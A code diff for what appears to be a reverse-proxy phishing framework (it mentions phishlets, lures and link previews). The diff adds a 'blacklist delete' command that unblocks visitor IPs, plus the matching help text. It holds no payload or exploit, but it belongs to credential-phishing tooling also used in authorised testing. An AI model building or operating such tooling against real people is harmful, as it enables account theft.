@@ -562,6 +562,13 @@ func (t *Terminal) handleBlacklist(args []string) error {
 				log.Info("blacklist log output: disabled")
 				return nil
 			}
+		case "delete":
+			ip := strings.TrimSpace(args[1])
+			if err := t.p.bl.RemoveIP(ip); err != nil {
+				return fmt.Errorf("delete: %v", err)
+			}
+			log.Info("blacklist: removed ip: %s", ip)
+			return nil
 		}
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -1841,7 +1848,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
 
 	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
-		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))
+		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("delete")))
 
 	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
 	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
@@ -1849,6 +1856,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
 	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
 	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")
+	h.AddSubCommand("blacklist", []string{"delete"}, "delete <ip>", "remove an ip address from the blacklist and unblock it immediately")
 
 	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
 		readline.PcItem("test-certs"))
